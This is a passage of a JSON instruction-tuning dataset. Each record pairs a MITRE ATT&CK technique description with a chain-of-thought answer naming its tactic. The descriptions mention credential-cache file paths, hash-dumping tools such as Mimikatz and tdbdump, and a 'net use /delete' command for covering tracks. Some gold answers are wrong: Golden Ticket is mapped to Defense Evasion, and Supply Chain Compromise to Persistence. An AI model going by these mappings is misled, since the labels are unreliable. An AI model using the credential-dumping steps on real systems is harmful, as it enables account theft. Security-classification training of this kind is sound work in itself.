    "output": "The given description is related to sub technique: Golden Ticket (T1558.001);\nSub technique Golden Ticket (T1558.001) is a type of technique Steal or Forge Kerberos Tickets (T1558);\nTechnique Steal or Forge Kerberos Tickets (T1558) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket. Golden tickets enable adversaries to generate authentication material for any account in Active Directory. \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets. The KRBTGT password hash may be obtained using OS Credential Dumping and privileged access to a domain controller.",
      "answer": "The given description is related to sub technique: Golden Ticket (T1558.001);\nSub technique Golden Ticket (T1558.001) is a type of technique Steal or Forge Kerberos Tickets (T1558);\nTechnique Steal or Forge Kerberos Tickets (T1558) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash. The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password.\n\nOn Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.domain.ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use Password Cracking to obtain the plaintext password. \n\nWith SYSTEM or sudo access, the tools/utilities such as Mimikatz, Reg, and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.?",
    "context": "",
    "output": "The given description is related to sub technique: Cached Domain Credentials (T1003.005);\nSub technique Cached Domain Credentials (T1003.005) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash. The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password.\n\nOn Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.domain.ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use Password Cracking to obtain the plaintext password. \n\nWith SYSTEM or sudo access, the tools/utilities such as Mimikatz, Reg, and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.",
      "answer": "The given description is related to sub technique: Cached Domain Credentials (T1003.005);\nSub technique Cached Domain Credentials (T1003.005) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command.",
    "context": "",
    "output": "The given description is related to sub technique: Network Share Connection Removal (T1070.005);\nSub technique Network Share Connection Removal (T1070.005) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command.",
      "answer": "The given description is related to sub technique: Network Share Connection Removal (T1070.005);\nSub technique Network Share Connection Removal (T1070.005) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a Server or Virtual Private Server, adversaries may compromise third-party servers in support of operations.\n\nAdversaries may also compromise web servers to support watering hole operations, as in Drive-by Compromise, or email servers to support Phishing operations.?",
    "context": "",
    "output": "The given description is related to sub technique: Server (T1584.004);\nSub technique Server (T1584.004) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a Server or Virtual Private Server, adversaries may compromise third-party servers in support of operations.\n\nAdversaries may also compromise web servers to support watering hole operations, as in Drive-by Compromise, or email servers to support Phishing operations.",
      "answer": "The given description is related to sub technique: Server (T1584.004);\nSub technique Server (T1584.004) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization\u2019s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise or Trusted Relationship)?",
    "context": "",
    "output": "The given description is related to sub technique Identify Business Tempo (T1591.003);\nSub technique Identify Business Tempo (T1591.003) is a type of technique Gather Victim Org Information (T1591);\nTechnique Gather Victim Org Information (T1591) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization\u2019s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise or Trusted Relationship)",
      "answer": "The given description is related to sub technique Identify Business Tempo (T1591.003);\nSub technique Identify Business Tempo (T1591.003) is a type of technique Gather Victim Org Information (T1591);\nTechnique Gather Victim Org Information (T1591) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.  These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. \n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., Steal Web Session Cookie) in addition to their username and password. This may enable the adversary to then bypass MFA via Web Session Cookie.\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page. By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans. These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., Phishing), which may be less secure in several relevant ways. For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.?",
    "context": "",
    "output": "The given description is related to sub technique Spearphishing Link (T1598.003);\nSub technique Spearphishing Link (T1598.003) is a type of technique Phishing for Information (T1598);\nTechnique Phishing for Information (T1598) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.  These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. \n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., Steal Web Session Cookie) in addition to their username and password. This may enable the adversary to then bypass MFA via Web Session Cookie.\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page. By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans. These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., Phishing), which may be less secure in several relevant ways. For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.",
      "answer": "The given description is related to sub technique Spearphishing Link (T1598.003);\nSub technique Spearphishing Link (T1598.003) is a type of technique Phishing for Information (T1598);\nTechnique Phishing for Information (T1598) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.?",
    "context": "",
    "output": "The given description is related to sub technique Compromise Software Dependencies and Development Tools (T1195.001);\nSub technique Compromise Software Dependencies and Development Tools (T1195.001) is a type of technique Supply Chain Compromise (T1195);\nTechnique Supply Chain Compromise (T1195) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.",
      "answer": "The given description is related to sub technique Compromise Software Dependencies and Development Tools (T1195.001);\nSub technique Compromise Software Dependencies and Development Tools (T1195.001) is a type of technique Supply Chain Compromise (T1195);\nTechnique Supply Chain Compromise (T1195) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Email addresses could also be enumerated via more active means (i.e. Active Scanning), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system. For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Email Accounts), and/or initial access (ex: Phishing or Brute Force via External Remote Services).?",
    "context": "",
    "output": "The given description is related to sub technique Email Addresses (T1589.002);\nSub technique Email Addresses (T1589.002) is a type of technique Gather Victim Identity Information (T1589);\nTechnique Gather Victim Identity Information (T1589) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Email addresses could also be enumerated via more active means (i.e. Active Scanning), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system. For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Email Accounts), and/or initial access (ex: Phishing or Brute Force via External Remote Services).",
      "answer": "The given description is related to sub technique Email Addresses (T1589.002);\nSub technique Email Addresses (T1589.002) is a type of technique Gather Victim Identity Information (T1589);\nTechnique Gather Victim Identity Information (T1589) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well. Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\n\nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.\n\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.",
    "context": "",
    "output": "The given description is related to sub technique Service Exhaustion Flood (T1499.002);\nSub technique Service Exhaustion Flood (T1499.002) is a type of technique Endpoint Denial of Service (T1499);\nTechnique Endpoint Denial of Service (T1499) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well. Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\n\nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.\n\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.",
      "answer": "The given description is related to sub technique Service Exhaustion Flood (T1499.002);\nSub technique Service Exhaustion Flood (T1499.002) is a type of technique Endpoint Denial of Service (T1499);\nTechnique Endpoint Denial of Service (T1499) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are binaries that may be digitally signed by Microsoft.  \n\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>ComRegisterFunction</code> or <code>ComUnregisterFunction</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.?",
    "context": "",
    "output": "The given description is related to sub technique Regsvcs/Regasm (T1218.009);\nSub technique Regsvcs/Regasm (T1218.009) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are binaries that may be digitally signed by Microsoft.  \n\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>ComRegisterFunction</code> or <code>ComUnregisterFunction</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.",
      "answer": "The given description is related to sub technique Regsvcs/Regasm (T1218.009);\nSub technique Regsvcs/Regasm (T1218.009) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system\u2019s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.\n\nAdversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of AppleScript, to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.?",
    "context": "",
    "output": "The given description is related to sub technique: Stripped Payloads (T1027.008);\nSub technique Stripped Payloads (T1027.008) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system\u2019s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.\n\nAdversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of AppleScript, to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.",
      "answer": "The given description is related to sub technique: Stripped Payloads (T1027.008);\nSub technique Stripped Payloads (T1027.008) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to Code Signing, adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.",
    "context": "",
    "output": "The given description is related to sub technique: Code Signing Certificates (T1588.003);\nSub technique Code Signing Certificates (T1588.003) is a type of technique Obtain Capabilities (T1588);\nTechnique Obtain Capabilities (T1588) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to Code Signing, adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.",
      "answer": "The given description is related to sub technique: Code Signing Certificates (T1588.003);\nSub technique Code Signing Certificates (T1588.003) is a type of technique Obtain Capabilities (T1588);\nTechnique Obtain Capabilities (T1588) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
    "context": "",
    "output": "The given description is related to sub technique: Symmetric Cryptography (T1573.001);\nSub technique Symmetric Cryptography (T1573.001) is a type of technique Encrypted Channel (T1573);\nTechnique Encrypted Channel (T1573) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "answer": "The given description is related to sub technique: Symmetric Cryptography (T1573.001);\nSub technique Symmetric Cryptography (T1573.001) is a type of technique Encrypted Channel (T1573);\nTechnique Encrypted Channel (T1573) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file\u2019s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file\u2019s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file\u2019s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header\u2019s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., Ingress Tool Transfer) and stored (e.g., Upload Malware) so that adversaries may move their malware without triggering detections. \n\nCommon non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.\n\nPolygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.?",
    "context": "",
    "output": "The given description is related to sub technique Masquerade File Type (T1036.008);\nSub technique Masquerade File Type (T1036.008) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
